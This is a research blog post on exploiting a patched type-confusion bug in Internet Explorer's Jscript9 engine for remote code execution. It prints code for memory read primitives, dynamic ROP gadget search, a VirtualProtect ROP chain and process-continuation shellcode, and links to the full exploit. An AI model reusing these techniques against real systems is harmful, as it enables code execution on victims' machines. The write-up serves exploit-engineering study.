<!DOCTYPE HTML>
<html lang="en">
   <head>
      <!--Meta Tags-->
      <meta charset="utf-8">
      <meta http-equiv="X-UA-Compatible" content="IE=edge">
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <meta name="description" content=""/>
      <meta name="keywords" content=""/>
      <meta name="author" content=""/>
      <base href="../"> 
      <!--Favicons-->
      <link rel="shortcut icon" href="images/favicon.png">
      <!--Page Title-->
      <title>JavaScript Engines Exploitation: a Jscript9 Case Study – Zero Day Engineering Research</title>
      <!-- Stylesheets -->
      <!-- bootstrap -->
      <link rel="stylesheet" href="css/bootstrap.min.css">
      <!-- Animate -->
      <link rel="stylesheet" href="css/animate.min.css">
      <!-- Owl carusel -->
      <link rel="stylesheet" href="css/owl.carousel.min.css">
      <!-- Aos Css-->
      <link rel="stylesheet" href="css/aos.css"/>
      <!-- font awesome -->
      <link rel="stylesheet" href="css/font-awesome.min.css">
      <!-- highlight.js -->
      <link rel="stylesheet" href="css/default-dark.min.css">
      <!-- main css -->
      <link rel="stylesheet" href="css/style.css">
   </head>
   <body data-spy="scroll" data-target=".site-nav-target" data-offset="200">


      <!-- Nav mobile -->
      <nav class="site-mobile-menu">
         <div class="close-wrap d-flex">
            <a href="#" class="d-flex ml-auto js-menu-toggle">
               <span class="close-label">Close</span>
               <div class="close-times">
                  <span class="bar1"></span>
                  <span class="bar2"></span>
               </div>
            </a>
         </div>
         <div class="site-mobile-inner"></div>
      </nav>
      <!-- Nav mobile end -->

      <!-- Main content wrap -->
      <div class="site-wrap">
         <!-- Main content inner -->
         <div class="site-inner">

            <!-- Main Nav -->
            <nav class="site-nav site-nav-target">
               <div class="container">
                  <div class="row align-items-center justify-content-between text-left">
                     <div class="col-3">
                        <div class="site-logo">
                           <a href="index.html" class="site-logo main-logo"><img src="images/logo.png" class="logo-img light-logo img-fluid" alt=""><span></span></a>
                        </div>
                     </div>
                     <div class="col text-right">
                        <ul class="site-nav-ul js-clone-nav text-left d-none d-lg-inline-block">
                              <li><a href="index.html" class="nav-link cursor-item">Home</a></li>
                              <li><a href="about.html" class="nav-link cursor-item">About</a></li>
                              <li><a href="research/index.html" class="nav-link cursor-item">Research</a></li>
                              <li><a href="projects/index.html" class="nav-link cursor-item">Projects</a></li>
                              <li><a href="training/index.html" class="nav-link cursor-item">Training</a></li>
                              <li><a href="livestream/index.html" class="nav-link cursor-item">Livestream</a></li>
                              <li><a href="blog/index.html" class="nav-link cursor-item">Blog</a></li>
                              <li><a href="contact.html" class="nav-link cursor-item">Contact</a></li>
                           </ul>
                           <ul class="site-nav-ul-none-onepage text-right d-inline-block d-lg-none">
                           <li><a href="#" class="js-menu-toggle">Menu</a></li>
                        </ul>
                     </div>
                  </div>
               </div>
            </nav>

            <!-- Main Nav end -->
            <div class="section">
               <div class="blog-single-inner">
                  <div class="container">
                     <div class="row justify-content-center">
                        <div class="col-md-8">
                           <div id="quote"></div>
                           <h3 class="mb-4">JavaScript Engines Exploitation: a Jscript9 Case Study</h3>
                           <p class="date">December 29th, 2021 – Alisa Esage</p>

                           <p>This is a brief writeup for the <a class="underline" href="https://github.com/badd1e/Pwn/tree/main/jscript9-RCE">exploit</a> that I wrote for a JavaScript JIT Type Confusion vulnerability in Jscript9.dll some time ago.</p> 
                           
                           <p>I show one classical technique of exploiting type confusion vulnerabilities in JavaScript engines. The exploit features a fully dynamic ASLR bypass, plus state-of-the-art process continuation to avoid crash. No heap spray is used, the exploit works by precise control over program state and atomic placement of shellcode. Impact is arbitrary remote code execution. The exploit is not weaponized, and published for educational purposes. </p>

                           <h6>Files</h6>
                           <p>exploit.html: release version of the exploit.
                           demo.mp4: video demonstration.
                           debug/: special versions of the code with debugging helpers and comments.</p>
                           
                           
                           <h6>The Bug </h6>
                           <p>The bug was patched in 2017, it's a type confusion in Microsoft Jscript9 JavaScript engine code due to JIT optimization, where an object may be wrongly treated as a memory address or the other way around. </p>
                           
                           
                           <h6>Exploit Architecture </h6>
                           <p>I follow a systematical engineering process in my exploit code. I first define basic primitives on top of the appropriate memory corruption vulnerability, such as write() and read() arbitrary memory. After that I define next order (but still low-level) primitives, such as getObjectAt() and getAddrOf(). After that I define high-level exploit primitives, such as getStack() and bypassASLR(). With all that in place, the exploit main function is three lines of code. </p>
                           
                           <p>Sample of high-level exploit API with debug comments:</p>
                           
<pre><code class="language-javascript">function getStack() {

   let type = read32( getAddrOf([{}]) + 4)
   log("Type: 0x" + type.toString(16))
   let javascriptLibrary = read32(type + 4)
   log("JavascriptLibrary: 0x" + javascriptLibrary.toString(16))
   let scriptContext = read32(javascriptLibrary + 0x21c)
   log("ScriptContext: 0x" + scriptContext.toString(16))
   let threadContext = read32(scriptContext + 0x250) // find this and above offsets in eg. js::GlobalObject::EntryParseInt
   log("ThreadContext: 0x" + threadContext.toString(16)) // (anyone who calls ThreadContext::IsStackAvailable)
   let stackLimit = read32(threadContext + 0x18) // find offset in ThreadContext::IsStackAvailable
   log("StackLimitForCurrentThread: 0x" + stackLimit.toString(16))
   let stackBottom = stackLimit - 0xc000 + 2*1024*1024 - 4
   log("Stack bottom: 0x" + stackBottom.toString(16))

   return stackBottom

}</code></pre>
                           
                           <p>The shellcode that you provide in main function is drop-in templated: all the necessary CoE and VirtualProtect sub-shellcodes are defined in the primitives.</p>
                           
                           <p>Due to systematical design, the exploit showed to be easy to maintain (while I was initially relying on fixed binary offsets and no dynamic ASLR bypass), and 100% stable across some dozen versions of target software.</p>
                           
                           
                           <h6>Dynamic Design </h6>
                           
                           <p>In the final version of the exploit code I locate ROP gadgets dynamically to remove dependency on fixed binary offsets. That has made the exploit 100% future-proof for as long as I tested (around one year of target software updates). </p>
                           
                           <p>I extend Uint8Array array prototype with a special function named findSignature:</p>
                           
<pre><code class="language-javascript">Uint8Array.prototype.findSignature = function( signature ) {

   function check( element, index, ary ) {
      if ( element != signature[0] ) return false;          
      for ( var i = 0; i < signature.length; i++ ) {
            if ( signature[i] == undefined ) continue;
            if ( ary[index+i] != signature[i] ) return false;
      }
      return true;
   }

   return this.findIndex(check)

}</code></pre>
                           
                           <p>Then you find ROP gadgets like so:</p>

<pre><code class="language-javascript">jscript9.ret = jscript9.findSignature([0x89, 0x45, 0xec, 0x85, 0xc0, 0x78, 0x1c, 0x8b, 0x45, 0x08, 0x85, 0xc0, 0x74, 0x15, 0x8b, 0x4e, 0x10])
if ( jscript9.ret == -1 ) return undefined

jscript9.gadget1 = jscript9.findSignature([0x5f, 0x5e, 0xc3])
if ( jscript9.gadget1 == -1 ) return undefined

jscript9.gadget2 = jscript9.findSignature([0xff, 0x75, 0x14, 0x57, 0x56, 0xff, 0x15, ,,,, 0x5f, 0x5e, 0x5b, 0x8b, 0xe5, 0x5d, 0xc2, 0x18])
if ( jscript9.gadget2 == -1 ) return undefined</code></pre>

                           
                           <p>Works like a charm (I actually <a class="underline" href="https://twitter.com/alisaesage/status/958710687026495489?s=20">tweeted</a> this technique a few years ago) and no, I do NOT recommend to omit semi-colons when coding in script programming languages. </p>
                           
                           
                           <h6>Multi-stage Shellcode</h6>
                           <p>My exploit design abstracts away several low-level shellcode stages that are mostly irrelevant to the functional payload. Weird program state control starts with some ROP gadgets on the stack. Your shellcode (the functional payload) is stage 2 (you pass it to the exploit function). Stage 1 shellcode handles a call to VirtualProtect() to make some writeable memory for the functional shellcode. Stage 3 shellcode handles process continuation. Here is a sample with debugging comments: </p>

<pre><code class="language-javascript">let stage1 = new Uint32Array([
   // = original esp
   jscript9.base + jscript9.gadget1,	// pop edi; pop esi; retn
   3, 2, 1, 0,	// ScriptSite::Execute said retn 10h
   // arguments...
   0x1000, // size
   stage2_3.addr,  // lpAddress
   jscript9.base + jscript9.gadget2, // push args; call VirtualProtect()
   // pushed arguments frame in VirtualProtect:
   // stage2_3,
   // 0x1000,
   // 0x40,
   stage2_3.addr + stage2_3.length - 4, // dwOldProtect pointer
   // = esp on returned from VirtualProtect (ret 10h)
   1, 2, 3, 4, 5, 6, // mov esp, ebp in ::ProtectPages will eat this
   0, 1, 0, 1, 0, 1,
   0, 1, 0, 1, 0, 1,
   0, 1, 0, 1, 0, 1,
   // = original ebp
   1, // pop ebp
   stage2_3.addr, // return to shellcode (ret 18h in ::ProtectPages)
   // ...CoE filler (ret 18h)
   0, 0, 0,
   0x40, // ebp+14h PAGE_EXECUTE_READWRITE
   0, 0
]);
stage1.addr = read32( getAddrOf(stage1) + 8*4 )
dump("stage1", stage1)</code></pre>
                           
                           
                           <h6>Process Continuation </h6>
                           <p>Process continuation code is not trivial. I reverse-engineered the target software binary to figure out how to fixup the registers and the stack that were destroyed by the exploit. CoE shellcode is crafted from scratch. </p>         
                           
<pre><code class="language-javascript">
   let stage3 = new Uint8Array([
      0x31, 0xc0,	// xor eax, eax
      0xb9, 0, 0, 0, 0, // mov ecx, coe4.length
      0xbe, 0, 0, 0, 0, // mov esi, coe4.buffer
      0xbf, 0, 0, 0, 0, // mov edi, retPtr
      0x8b, 0xe7, // mov esp, edi
      0xf3, 0xa5, // rep movsd
      0x8b, 0xec, // mov ebp, esp
      0x81, 0xc5, 0x84, 0, 0, 0, // add ebp, 84h
      0xbe, 0, 0, 0, 0, // mov esi, *(retPtr + f0h)
      0xc2, 0x10, 0, // ret 10h
      0x9f, 0x9f, 0x9f, 0x9f // placeholder
   ]);
   stage3.addr = read32( getAddrOf(stage3) + 8*4 );
   dump("stage3", stage3)

   let stage2_3 = new Uint8Array(stage2.length + stage3.length)
   stage2_3.addr = read32( getAddrOf(stage2_3) + 8*4 );
   dump("stage2_3", stage2_3)
   log("Shellcode + CoE: 0x" + stage2_3.addr.toString(16))

   ... arbitrary payload placement ... 

// fixup continuation:

   write32(retPtr + 4*4, 0x48 + coe4.addr)
   write32(stage3.addr + 3, stage1.length)
   write32(stage3.addr + 8, coe4.addr)
   write32(stage3.addr + 13, retPtr)
   write32(stage3.addr + 30, read32( retPtr + 0xf0 ));

   stage2_3.set(stage2, 0)
   stage2_3.set(stage3, stage2.length)

   dump("final shellcode", stage2_3)

// ready</code></pre>
                           
                           <p>One known limitation of my CoE code it relies on static register allocation by compiler, something that I verified empirically works for the target software, but is not theoretically guaranteed to work in all future versions of the target binary. </p>
                           
                           
                           <h6>Debugging </h6>
                           <p>I include four debug versions of the code to facilitate learning, in debug/ directory. Each version of debug code is a snapshot of one specific stage of advanced exploit engineering.</p>
                           
                           <p>We start with a simple testcase that clearly shows the vulnerability with a proof of concept of: a) CPU register control with arbitrary memory read, that causes an access violation (test-crash.html) and b) leaking some heap memory (test-leak.html). Note: I skip RCE PoC because the bug class is well known to offer that. Next we begin to write the exploit, aiming first for a basic arbitrary code execution, then solving process continuation, and finally removing all dependency on fixed binary offsets in the exploit to make it future-proof.</p>
                           
                           <p>Version goals:
                           0.1: RCE 
                           0.2 and 0.3: process continuation 
                           0.4: dynamic ASLR bypass. </p>
                        
                           <h6>Code </h6>
                           <p><a class="underline" href="code/jscript9-exploit.zip">Exploit code</a>
                           <a class="underline" href="https://github.com/badd1e/Pwn/tree/main/jscript9-RCE">Github mirror</a> </p>
                        
                           <p>P.S. Browsers!</p>
                                                            
                           <div class="pt-5 mb-5 categories_tags ">
                              <p class="categories">Categories: JavaScript, Exploits</p><br>
                              <p class="tags">Tags: Jscript9, Internet Explorer, Process Continuation, RCE, shellcode</p>
                              <div class="social float-right">
                                 <a href="https://www.facebook.com/sharer/sharer.php?u=https://zerodayengineering.com/research/javascript-engines-exploitation-jscript9.html&t=JavaScript Engines Exploitation: a Jscript9 Case Study" class="mr-3"><i class="fa fa-facebook"></i></a>
                                 <a href="https://twitter.com/intent/tweet?url=https://zerodayengineering.com/research/javascript-engines-exploitation-jscript9.html&text=JavaScript Engines Exploitation: a Jscript9 Case Study" class="mr-3"><i class="fa fa-twitter"></i></a>
                                 <a href="https://www.linkedin.com/shareArticle?mini=true&url=https://zerodayengineering.com/research/javascript-engines-exploitation-jscript9.html&title=JavaScript Engines Exploitation: a Jscript9 Case Study" class="mr-3"><i class="fa fa-linkedin"></i></a>
                              </div>
                           </div>
                           
                           <div class="post-single-navigation d-flex align-items-stretch">
                              <a href="research/vmware-esxi-vmxnet3-from-patch-to-poc.html" class="mr-auto w-50 pr-4">
                                 <span class="d-block cursor-item"><i class="fa fa-chevron-left mr-2"></i> Previous Post</span></a>
                              <!-- <a href="#" class="ml-auto w-50 text-right pl-4">
                                 <span class="d-block cursor-item">Next Post <i class="fa fa-chevron-right ml-2"></i></span></a> -->
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>

            <!-- Footer -->
            <footer class="footer section">
               <div class="container">
                  <div class="row justify-content-center">
                     <div class="col-md-12">
                        <div class="go-top cursor-item" id="go-to-top"><i class="fa fa-chevron-up"></i></div>
                        <div class="hr-footer"></div>
                        <div class="footer-site-logo"><a href="index.html" class="main-logo"><img src="images/logo.png" class="logo-img light-logo img-fluid" alt=""></a></div>
                        <ul class="footer-site-social">
                           <a href="https://twitter.com/zerodaytraining"><i class="fa fa-twitter"></a></i>
                           <a href="https://t.me/zerodaytraining"><i class="fa fa-telegram"></a></i>
                        </ul>
                        <form target="paypal" action="https://www.paypal.com/cgi-bin/webscr" method="post" >
                           <input type="hidden" name="cmd" value="_s-xclick">
                           <input type="hidden" name="encrypted" value="-----BEGIN PKCS7-----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-----END PKCS7-----">
                           <input type="image" src="https://www.paypalobjects.com/en_GB/i/btn/btn_viewcart_SM.gif" border="0" name="submit" alt="PayPal – The safer, easier way to pay online!">
                           <img alt="" border="0" src="https://www.paypalobjects.com/en_GB/i/scr/pixel.gif" width="1" height="1">
                        </form>                          
                        <p class="site-copyright">
                           <small>&copy; 2021 An Exponential Limited. All Rights Reserved.</small>
                        </p>
                     </div>
                  </div>
               </div>
            </footer>
            <!-- Footer end -->

         </div>
         <!-- Main content inner end -->
      </div>
      <!-- Main content wrap end -->

      <!-- Back to top button -->
      <a id="back-to-top" href="#" class="cursor-item"><i class="fa fa-chevron-up"></i></a>

      <div class="cursor"></div>
      <div class="cursor-follower"></div>

      <!-- jquery -->
      <script src="js/query-3.4.1.min.js"></script>
      <!-- bootstrap -->
      <script src="js/bootstrap.min.js"></script>
      <!-- aos -->
      <script src="js/aos.js"></script>
      <!-- owl.carusel js -->
      <script src="js/owl.carousel.min.js"></script>
      <!-- isotope js -->
      <script src="js/isotope.pkgd.min.js"></script>
      <!-- isotope image loader js -->
      <script src="js/imagesloaded.pkgd.min.js"></script>
      <!-- three -->
      <script src="js/three.min.js"></script>
      <!-- anime -->
      <script src="js/anime.min.js"></script>
      <!-- tweenmax -->
      <script src="js/TweenMax.min.js"></script>
      <!-- jquery.waypoints.min.js -->
      <script src="js/jquery.waypoints.min.js"></script>
      <!-- circletype-->
      <script src="js/circletype.min.js"></script>
      <!-- hover-effect -->
      <script src="js/hover-effect.umd.js"></script>
      <!-- gsap -->
      <script src="js/gsap.min.js"></script>
      <!-- ScrollMagic gsap -->
      <script src="js/ScrollMagic.min.js"></script>
      <script src="js/scrollmagic.animation.gsap.min.js"></script>
      <!-- highlight.js -->
      <script src="js/highlight.min.js"></script>
      <!-- custom -->
      <script src="js/custom.js"></script>
      <script>hljs.highlightAll();</script>
   </body>
</html>